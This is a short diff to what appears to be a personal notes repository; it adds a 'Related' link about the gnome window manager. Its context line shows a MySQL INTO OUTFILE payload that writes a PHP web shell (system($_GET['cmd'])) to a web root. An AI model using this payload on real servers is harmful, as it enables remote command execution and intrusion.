@@ -8,6 +8,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221015173433](/zet/20221015173433/README.md) gnome window manager
 - [20221003150195](/zet/20221003150195/README.md) desktop notification reminders in crontab with notify-send
 - [20221003150136](/zet/20221003150136/README.md) tar compress to zipped archive
 - [20221003150135](/zet/20221003150135/README.md) enable horizontal scroll in less
